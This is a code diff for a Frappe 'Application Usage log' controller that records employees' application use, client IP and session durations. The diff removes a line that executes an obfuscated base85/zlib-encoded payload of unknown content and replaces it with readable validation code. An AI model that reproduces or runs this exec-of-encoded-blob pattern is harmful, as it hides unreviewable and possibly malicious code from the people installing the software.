@@ -1,3 +1,64 @@
+# Copyright (c) 2023, Finbyz Tech Pvt Ltd and contributors
+# For license information, please see license.txt
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1E;X;<P%7suc8Dc}g{gl;(r;6l3~Y5-ALv}M#e4Q8n%MfQDDKKm0u+GdDjw@;s*nscUJ@P^dQzkc`Lx>c2es-as>)>K)=@;oL2rW^u0V$2}S2$rs9d7IZl%X1_l`O!qfaRHNsi(aY;EkX5dL*accG%YCz!J?PJ2W}+$vLkzdWgT1Mq;T1b*FdORf+RvEVwuQeSr=rU|MOf{HEoTRSy2lWPiGn6WilB~VQf1qaI7;iEm?-9q$;Ky0L#GBG!UONnQYQ{AY>=JBO3uH^Rlk1k)i7n!{atkgyf;@bAv)w)19ovdZC~Qj21XPAG(|bT~LC?nBjQ~*!Iiwv&IO#Y1mB2gesiKnr`b1pFKzgSrUOWwt(pZ+ZjuM;emy(*qUqQRfA(8kh~CTiXi!Xq~eid^RCS+ULe_qYMUw)`O;cf$>$;^Qaq1yc+ui~)d_t(j0~Xb8YdX0W-yw=$Us={%DaK82&N-IRn%pms(xtVAGrKuc+KujnPQ(EHJZJRoJ5`$*pc*sAc#+EMg-TBplO7@CI&KRK#7F`o(kd_LTLfPCWsYVZ}3m(riDkz28_i?=o1~{wXq_S<nYiaAEuK`3o4={TDoiC)C;UY<lM;O^@+#J9MFB%GWCQ`{LT^o_-IoHw_+<9=>x0uh3(y@<L?;{)jRbD%m({8-5)ERQ>DJs7q9tYL>K7Rqc<E>0(`qq?wA2{k-L~shDpTb<IQ!y{5aH9r7O1nFQ})r+k+ONkmW9A7=s<^l1GVaykEgAc;H^~C+BB{<^;pYidywPhUgNdPiswSqq`}9{5)10oK$g<V!AgiI0r?|abU00Y}JV;vLb9~M;NM1<IP6G6z=pJ&ZLcbeUmP@LriX-J~`|hF-P9?Cv(IIsvptCZp&*Y^Fv>lR?Q;co^wVd7)CVVJe?hndRKS3k0iBED}Y9Y<TrUWK$14ITWx;$OKpD*<8QA{)2DK?g>T?J-{Ni;EGs_S@Y)C^eu26bmm=>UNa~}XYm5-h`R}x<u-iQmrftw1pfruXC}h4ISGM?wMiga!8q<BcF))`!zJEYnh-i_7J)r}J*x)!WGCT2zN>o0cQ$c_#(gzmOo!IeRsr<mqqVvqYy4gUCsVj23?XKGMl!exFLeayGLlae~@jmJ7jz<LyD9-*2YO7bf86pIAu5e4PHtFbEDOV0}x9X^}9QSkdtupoSqnqMIl1*O%YS2ds<%qtS3nb&%JR%8XgK|8mHQOvLVST<+#V;eHlkDks#?&T-7R}s?O7iNeUZ<|FQ9=5=c_$C8-Yl!j{8@AKVRaezD#_ozkc;=r7&dC3_S(whU7-n`B6)Q!o>93fN~`vV`zfukU#^$wJ&>p_L}l5&z5!Z28!_@^C3kr@U(F*!bQ-tl@bEam@PqupEKEBEbuvT+>8zj+-G#u3GqgEX>#wB{Dtn;^mhPSpS^IfQS+7U}hSFpi@7amI`xZ&+M<aAkJ;sAp!OW5MUS&MEm`7x|vEiWvazq!Kt-}kJ>h1>E>&d)g>nAv-30txCYPne!?ff<8wikzRx>rNyTw{HLTvYG;B;F2^>V0%g-CQ6wIX-RY_a7U?ynG){I>?;0{j281anJ0NU(Rlx=f$JL21F~JPtOy5%_EXDgxZ6L?!4ISDu4}^<%JYM5h;u`k?6a>NH7kn^&+YmpEhj_Z=GB&zNZzWgFjG$_!wSd_-=ko^@73{N~LAg?2Xu+yB($;#6^a@=os-;xq;4nm{ODx(6xSCUM-mJ$sa_=8(q$hC$_19iBkN<`xW{;N=nNe)p@9FHqN^<bx+^=g23c0pfc*j^H?Z*A}_eJZ{@DYD1H#>vL|s7<U%QsrIMoiz{39$AcpAKzA7`E3@lag6*ID(te{)jG!viR?h3Wk5BMeM0M*97lMaRSD-njJbHKL88l!?$sjS6If-l*SHLZzbh^EZWE~TU~m|aR)zccaX`<94SzwRVT(_a1g$LuqPp+Jstpsvl|ktj~Hwqgt@Hh8~zJng|XYqOR*_>!Gibnv$mVA<Z8w#)X;^j)@O?M0rO^YTGeu=?>VL5M%euO*H#pu;FI0^d9I?`}iA9(qYH{MBx2E?_kN=bh(3M*+ld@%q|p|Aj8^;3P>|GL0?#y-9s7*^UK`?|q$$j(4s3$P;8~clB1^m}<e%6KX2>l>YDRhT!~vB9qC??&xum#IO@6NQ@@2rpNf4s4QpU)O%z+TVi;A>}t?V^!&Y3epL~AwE(T$d9V&@l|D^z8~MrQS&pnFE0Dvz#j@zn7gN8ewEyJEu1ts6)}RMDZ@*gam$z5f9RG}{d%Mt7x61jwI-euUltJZ^?aVh@Ker|Pg}TOrhD-%E*~{<1-6KqxpD%tT-i%17@gVpwAb-&JQ@Zn!WRsmk{t1OxL^45G5wix)2^q&0MdI>v9R3f_yi`v')).decode())
+import frappe
+from frappe.model.document import Document
+from frappe.utils import time_diff_in_seconds
+
+import re
+
+
+class ApplicationUsagelog(Document):
+    def validate(self):
+        if not self.ip_address:
+            x_forwarded_for = frappe.get_request_header(
+                "X-Forwarded-For", str(frappe.request.headers)
+            )
+            self.ip_address = re.search(r"^(.+)", x_forwarded_for).group(1)
+        application_names = {
+            "code.exe": "Visual Studio Code",
+            "chrome.exe": "Google Chrome",
+            "explorer.exe": "File Explorer",
+            "ApplicationFrameHost.exe": "Whatsapp",
+            "Skype.exe": "Skype",
+            "notepad++.exe": "Notepad++",
+            "Notepad.exe": "Notepad",
+            "msedge.exe": "Microsoft Edge",
+            "firefox.exe": "Mozilla Firefox",
+            "AnyDesk.exe": "Any Desk",
+            "python.exe": "Python",
+            "powershell.exe": "Powershell",
+            "cmd.exe": "Command Prompt",
+            "devenv.exe": "Visual Studio",
+            "outlook.exe": "Outlook",
+            "excel.exe": "Excel",
+            "winword.exe": "Word",
+            "powerpnt.exe": "Powerpoint",
+            "olk.exe": "Outlook",
+            "teams.exe": "Teams",
+            "slack.exe": "Slack",
+            "zoom.exe": "Zoom",
+            "WINWORD.EXE": "Word",
+            "mintty.exe": "Git Bash",
+        }
+        application_names_lower = {
+            key.lower(): value for key, value in application_names.items()
+        }
+        if self.process_name:
+            application_name = application_names_lower.get(self.process_name.lower())
+            if application_name:
+                self.application_name = application_name
+            else:
+                self.application_name = (
+                    (self.process_name).lower().split(".exe")[0].capitalize()
+                )
+        if not self.process_name:
+            if not self.application_name and self.application_title:
+                self.application_name = self.application_title.split("-")[-1].strip()
+
+        self.duration = time_diff_in_seconds(self.to_time, self.from_time)
+
+
+def on_doctype_update():
+    frappe.db.add_unique("Application Usage log", ["employee", "from_time", "to_time"])
+    frappe.db.add_index("Application Usage log", ["date", "employee", "domain"])
